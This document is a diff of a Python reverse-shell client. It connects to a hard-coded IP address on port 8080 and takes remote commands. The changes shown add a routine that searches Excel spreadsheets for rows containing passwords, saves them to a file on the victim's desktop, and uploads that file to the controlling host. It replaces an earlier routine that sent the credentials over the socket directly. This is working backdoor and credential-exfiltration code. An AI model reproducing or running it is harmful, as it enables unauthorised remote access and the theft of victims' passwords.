@@ -9,8 +9,9 @@ import subprocess
 import os
 import time
 import pandas as pd
+from openpyxl import Workbook
 
-# does this work
+
 def initiate():
     tuneConnection()
 
@@ -21,7 +22,7 @@ def tuneConnection():
     while True:
         time.sleep(5)
         try:
-            mySocket.connect(("192.168.23.128", 8080))  # Insert IP address here
+            mySocket.connect(("10.3.130.234", 8080))  # Insert IP address here
             shell(mySocket)
 
         except:
@@ -40,17 +41,21 @@ def findPasswords(directory):
                         if cell and "password" in str(cell).lower():
                             passwords.append(row.tolist())
                             break
-                #line = df.where(df.contains('Password', case=False)).dropna()
-                #passwords.append(line)
+
+    if passwords:
+        # Write filtered rows to a new Excel file
+        global excelPath
+        excelPath = "C:\\Users\\siequia\\Desktop\\supersecretpasswords\\passwords.xlsx"
+        wb = Workbook()
+        ws = wb.active
+        for row in passwords:
+            ws.append(row)
+        wb.save(excelPath)
+        print("[+] Passwords written to passwords.xlsx")
+    else:
+        print("No .xlsx files found")
+
     return passwords
-
-
-def sendPasswords(mySocket, passwords):
-    for row in passwords:
-        password_data = ','.join(map(str, row))
-        mySocket.send(f"Credentials: {password_data}".encode())
-    #for password in passwords:
-    #mySocket.send(f"Credentials: {password}".encode())
 
 
 def letGrab(mySocket, path):
@@ -118,10 +123,14 @@ def shell(mySocket):
                 break
 
         elif 'searchExcel' in command.decode():
+            searchExcel, directory = command.decode().split("*")
             try:
-                searchExcel, directory = command.decode().split("*")
                 passwords = findPasswords(directory)
-                sendPasswords(mySocket, passwords)
+                if passwords:
+                    print(passwords)
+                    letGrab(mySocket, excelPath)
+                else:
+                    print("No .xlsx files found (in shell call)")
             except Exception as e:
                 informToServer = "[+] Some error occurred. " + str(e)
                 mySocket.send(informToServer.encode())
